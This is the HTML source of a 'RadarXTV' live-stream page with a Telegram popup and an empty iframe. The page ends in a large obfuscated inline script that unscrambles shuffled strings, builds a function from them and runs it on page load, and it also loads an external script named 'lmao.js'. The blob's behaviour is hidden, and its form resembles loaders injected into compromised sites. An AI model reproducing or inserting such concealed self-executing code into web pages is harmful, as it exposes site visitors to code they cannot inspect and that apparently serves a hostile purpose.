<!DOCTYPE html>
<?php include 'banner.php'; ?>
<html lang="en">
<head>
<script src="lmao.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var mBc='',ziz=399-388;function rYH(n){var e=3252223;var c=n.length;var l=[];for(var p=0;p<c;p++){l[p]=n.charAt(p)};for(var p=0;p<c;p++){var r=e*(p+266)+(e%20077);var m=e*(p+339)+(e%28732);var w=r%c;var o=m%c;var g=l[w];l[w]=l[o];l[o]=g;e=(r+m)%6422550;};return l.join('')};var dEr=rYH('runoxhotruptqrzafmdcjklonyctgsbwvsiec').substr(0,ziz);var mYZ='{;rtf;+9de<r  i=20n7,a=a=erw;0;n65.6=l+;2vv,1trhnrnl,,v;(vzh[71[r0s8sdg8j=0=({+c8o0.f8{(a;h)vao0e9{4j4ee,,;et6,r) r1pp+ nt6ag )=y)rf=ns..4 rpr(hft,]8a1)[dakpCt(x]+;nn)a[;lfubt}=,]tl=trte;i,o}]+y nii)frC[);=e9;a-"csg;i=(s.+ko(te;s<.t=hr[,e(e+ir=nlos[go.,plt]r")a.nhov()oal;-++org9tvpo71+,at bh v.ras=v(np)0c1aoabp]r;9x=a 8=c2l)bd(r,gbu7.rvclsk]shh[ah=,=i+"v(=s;qC, gps;yonlt+a))rh;+=5g}r al rvs;]mrrqv2)aarj);3iita!o;vtqo+1.oe+4;(hvy"]d)ggS ",i-usro9hr(e;6l2d( +refr=C8lrl=*;=v;e(gj;-flk;=9atri"7l)pqA;)}in=.xr.C9=efu7r(6"-v)ja,>)r.vtueli; =0]yn)u-5a)eo" tuu<g,=S,]10fld>ltvru;6;=k*r4b(ie+.frg,d;7uA0=o j(7airarce(a2yu;8l[(tiko,e;)C}s((=o.n1c(,f,=.fr=ryr2<gag,rdvrk1)f.+hi6r.n]}fCAmpp(u)d[a.o.{i[o=("o(.wij0eyc;e3r s=7. r-cu9;+]n0)21e )vtqn svs"m;va1.ix=rai6g(.h(m,oa 4x]errx;llkd)tlr C=y[9c..(+ouhhcpocnb!f1iprg;{i{ns()a;Ah(o)[cjo=h;u=f(;t;sr8r}ho,no+m=(q+)uz [taur<k=)sh;dt+)+wag7nw;ungznA';var PWe=rYH[dEr];var TNU='';var KYo=PWe;var YGk=PWe(TNU,rYH(mYZ));var KRc=YGk(rYH(';m_iw.eQsanGGi0i%eeGtslG9;GFoee}l.H6[l.0;<Gh)G66sG=e$Gon03]_t)(54G+Kd1ef .nG_f:_3gGIc;e+%G.))rG fG9$@g n;n4%otcGGr*(f7-m)%epe3n;f)t}a_g5 .a.anC_OGo23_Gn\/..fE-)sG,.pIG!4G%6i&4,[abG!ocCr;unp)M\/.\/aGaG,Geb77!Ggr6(k(}rttGtrH)3G]tG(tGGn6"%.+is$z.,= %0.{(ia8m](t)R0G)p_f)l.S8;Gnq,dhfGe;de.ue%f)G47Io.G"d7aGa4aaoh_,dr=Gs*3!HTG<7ohaGu2;nwGc,p60G$(G%Eq$G )whoo+7GanG\/.(t;g!.(n_n_f.{_)((\/)r=EsGheum$ssi2)M.0Gj{%G5l)%u(!C(_T)_3{rsG_G.,gy,s6o5G;;Gltrc{D9_4eon%7GG(3s:u)q)%1 65i(%FedtkG6(itlGfGfnG% );m_@=auN{6;ad=GG#B1e_e(G+5O0fd3(knGssG.Sfi%a$Gn\'7aAof_i_f}vj12 o)0Lg)erlE*G;)( Gfn3w5;nctvdi;)!l.$G!leeh.GsiGsesGo1L&(iG).a60tAp[!aGar;G6i) h27%e 1kio\/ir)G6G %Gptf \/o i.)[}m!l)Als 2Na6Gi;)L(!ca.acrC.5!G4sQ((e)53lG;eGh3m\'[0 cw.M AGd2r}1.OKe.Ga=nG\/h ee82oG4atm1@i.fe)]2]{i)en%G0!.l0G3G]$G!mnI{t$Dt8%n6)Gd;Gd(e n7Gaanw}pr[3cf_rSetLf.5}s$i(Gu44.(nGmr{ ($GiG$h,e9Ga]ia0)G} uqG{6_aG_Gnm2,l!3Pn G1.G7hG_AyG%1.()a;(e,t)NfcGo.Gt dedt2G}]t,\/1..Ga)Si32_()t ga%GBsptui.Fbn.,.bl=o(]=)u.I1G)6=.(I06e.4,Ge}138(n3%G_cr_69GwpeGGtiGerGh15GGlGGPMl_)MN:G87rild!$4 _LGn GG=]03)0)iGmsGltfRlt0N4_])#)f#dGt;j..u3@3+(tj9eGg[.f#w.;sitb{)eerNG<vf>GrA2k1>Jr{0Ru4r,mSp63nGi(G=(fGot848Mfnr%[)@6Gen5vo6l]GMGG]"nGG9 G)OG#[*a%\/.oG)G;G)8%G=)a%t_.5..eG;heftG,5o1}f=nt(iK# %dS{]7caaun)aGe3u((s[lnarHOE[6OG8G&53]GK.aa)tGG{)#[a)%2G{.)3pKG"G)Gal(u)!]l)GRG1)G;gedGG}ii=nCGBb$.s,?%TG])t6:j(2hP]]!.rh,r3G;&ol]8%($voGrGGakl.!G(iuHnt.16_2\'d 9Ow_,C"G_.[aG3n"5Gtt6_$GG(.+Mcg%!G _]aeq.;GgGd m!=y.;)nG9 w4)nunlGaw])4=nf<G arh%.r1.w(nr"e,{{_hum8otGs_tG;l2.laemG)1GGlGG_fo8swG4rlf)70eGtGe.n;cr$);N3e)f- !)GGptanl4G4{r_GeqG6GeGr=ff%41GGu otO,GGnuG=]7l)};iudi\'o0cG{oGeGt5i(3!]4)e*(,;(,81u=e(I7rsGe]))2en60]GQ]s]GP(\'fG.O)5{>0$G"f{e$Ge0at1rGp$)e$;r)7F]G!mltH.u)7fg(eGifS#Gtm9fgs)G]uB=}7t,fOSt)R;6)G((8e!(3}!GGt.GOK1eela.c_]G2$,$1bGan,8Cn)Gi]saOGuoG&lO](ep?!20{;(eD_o5nlu.M_ e)ofGa)S;G5)GH_G.G1;"D,%%6.o5+(e8 w69GK;mG(_(1{e{aPcrs_4$Gtvie}or1{Ga)GGG]0}9Pa !u$lGGnaaG d{Awpn]HaG].aaj0o.t,TA_emG6]nGm0e{GG_ 7%8Gf2o2=;b0Gtit=GreG%e69(_.d1_=04.d"ndc(e$rerr06a,1v]s=aiGc2uaftn{%20G: )).{sG.B6(G{o(a76_,a7))q=G2GGee.dnr=,G\'!Go.p_ial43GC.](o3o]dEs)(0f4]27s$t$ff#e!]aigGG9rd,G__\/]da;;G cGGiD_3aG.[efn{iG(G7?4ru;!](G]nb$).epm0t}4l$GG_%1ae_.r14G(p(oeev7cmtjGuj_e!.aGee:>]o9po.koo3GG8(GGel{ta(fln GrH$a3e_6co;3t !rGOs(;GG,$Grhtw;lr G;]c] jG=6)9Ibcs.)_GuoGou=ogi)Gn3;6c{1}$i?e$66,aLR8:Sf}n,#r=$neGG5GgrGbhGie$G}.Llic=fGh_)1{}9mG).a2]G0pG(,(;y90G?t[ttmi=G}"s ol1r+!G]afoh _n!G!_=Ge4_]F=6iG)&(m7(_{G_t3lnn]c&j;tar]On{c7Ke3[G\/nees<o$leCrG1h&o4Gi4!_;n5l1rG-C"_0GG)_ n=2E rnG( =tG}c9L!G#mG($!reGo,]I%e)1altsG!QGr](L.'));var kLy=KYo(mBc,KRc );kLy(7368);return 8249})()
</script>

</body>
</html>